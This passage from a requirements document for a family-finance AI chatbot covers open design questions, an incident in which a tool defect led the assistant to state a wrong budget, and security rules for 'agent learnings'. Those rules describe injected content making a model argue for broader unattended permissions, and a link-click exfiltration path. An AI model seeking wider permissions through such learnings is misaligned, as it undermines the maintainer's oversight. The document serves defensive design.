| ~~Q-P01~~ | ~~Cap values for `interactive` vs `background`.~~ | **Decided.** $20 interactive / $5 background stands, as shipped — the BRD's proposed $15/$5 is not adopted, because cutting a cap the family already relies on to fund a background workload that does not exist yet trades a real regression for a hypothetical. Configurable via `CHATBOT_MONTHLY_LIMIT` / `AI_BACKGROUND_MONTHLY_LIMIT` if that changes. |
| ~~Q-P02~~ | ~~Trace retention period.~~ | **Decided & implemented.** 30 days, with a `pinned` flag exempting traces referenced by an open learning. A hard cap of 1000 traces per family bounds the file regardless; pinned traces are evicted last, never first. |
| Q-P03 | Does the plan-card legibility threshold (25 rows) hold in practice on mobile? | Validate during Phase 3 with a real 40-row recategorization. |
| Q-P04 | Should T2 automations run on a schedule, or on data arrival (post-Plaid-sync)? | On data arrival — it bounds volume to what actually changed and makes idempotency natural. |
| ~~Q-P05~~ | ~~Where does the trace/incident store live given the JSON-file storage model?~~ | **Decided & implemented.** Per-family JSON at `ai_traces_{familyId}`, written by `AgentTraceStore` — a narrow appender over that one namespace, not a general write capability handed to the chatbot. Retention is applied on each write rather than by a separate sweep. |
| ~~Q-P07~~ | ~~Should §11's Business Workspace AI exclusion be enforced, given it removes a working feature?~~ | **Decided.** Enforce it — confirmed by the owner: no real use case for AI in that workspace. `refuseBusinessWorkspace` 403s every chatbot route for a business-scoped JWT; the frontend also hides the surface, but the route guard is the control. Covered by `businessWorkspaceAi.security.test.ts`. This closes a live exposure, not just a policy gap: a business-workspace token could read client royalty transactions through `get_spending_by_category`. |
| Q-P06 | External links are clickable today (`protocols.href` allows http/https), which SEC-P024 forbids. Enforce it, or amend SEC-P024? | Undecided. Enforcing costs the ability to cite a restaurant or bank URL in trip and budget conversations; amending accepts a click-gated exfiltration path. Decide before Trips read tools ship in Phase 2, since that is when external URLs start appearing in output. |

---

## 15. Reserved — Agent Learnings

Full specification lives in a **separate BRD** (`AI-AGENT-LEARNINGS-BRD.md`, pending). This section reserves the platform decisions so that tooling built in Phases 1–2 does not foreclose it.

### 15.1 Motivating Incident

A user asked about the household's Subaru maintenance budget. The assistant stated a $500/month budget. The actual budget was $0 / unset.

The probable mechanism is a **tool-design defect, not a model defect**: `getBudgets` returns `{id, categoryId, month, amount}` with no category names, and a category with no budget row is simply absent from the array. Answering the question requires joining an ID-only list against `get_categories`, and absence is indistinguishable from "I did not look." The tool's own description compounds this by claiming it returns "budget amounts **and actuals**" when it returns no actuals at all (`chatbotPrompt.ts:80`).

This incident is the reason for SEC-P032, SEC-P033, and REQ-P019 — and the reason for D-P08: **an agent asked to introspect "why did I say $500?" cannot observe any of the above.** It would produce a fluent, confident, wrong learning — the same failure mode one level up.

### 15.2 Reserved Platform Decisions

| ID | Decision |
|----|----------|
| REQ-P070 | Learnings are a distinct capability class: a write to an isolated, maintainer-facing collection containing **no family data of record**. It is not T1 (no user confirmation is meaningful) and not T2 (it touches no family data). It is governed by its own rate cap and by SEC-P050–P052. |
| REQ-P071 | Two capture paths: **capability gaps** are agent-written (the agent knows its own tool list with certainty, making these factual and verifiable); **quality incidents** are user-triggered via a flag control, capture evidence only (§10.2 bundle), and carry no agent-authored theory of cause. |
| REQ-P072 | Learnings carry a status and are reviewed offline by the maintainer, eventually via an `/evaluate-learnings` skill operating on open items. |
| REQ-P073 | Each flagged quality incident should become a permanent eval case, so a fixed failure stays fixed. This is the primary long-term value of the feature. |
| SEC-P050 | **Learnings are advisory only and must never be auto-applied.** A learning is model-authored text that a human later acts on, making it an injection path *through the maintainer*: adversarial content could produce a learning arguing that the agent needs broader unattended permissions. |
| SEC-P051 | `/evaluate-learnings` must treat learning content as untrusted input and must display provenance (which conversation, which trace, agent-written vs user-flagged) alongside every item. |
| SEC-P052 | Learnings and their evidence bundles must **not** be routed to GitHub via `submit_github_issue` or any external service, despite that path already existing. Incident evidence contains family financial transcripts; that path would push them to a third party under a PAT. Local store only. |

---

## 16. References

- [AI-CHATBOT-BRD.md](AI-CHATBOT-BRD.md) — read-only boundary, SEC-018, cost cap
- [AI-CHAT-ACTIONS-BRD.md](AI-CHAT-ACTIONS-BRD.md) — propose-confirm mechanism, nonce lifecycle
- [AI-CATEGORIZATION-BRD.md](AI-CATEGORIZATION-BRD.md) — first T2 candidate
- [AUTO-CAT-SUGGESTIONS-BRD.md](AUTO-CAT-SUGGESTIONS-BRD.md) — deterministic clustering precedent
- [BUSINESS-WORKSPACE-BRD.md](BUSINESS-WORKSPACE-BRD.md) — fiduciary exclusion rationale
- [PROJECTS-BRD.md](PROJECTS-BRD.md) §5.5.5 — non-additive line-item actuals
- OWASP Top 10 for LLM Applications — LLM01 (Prompt Injection), LLM06 (Excessive Agency)
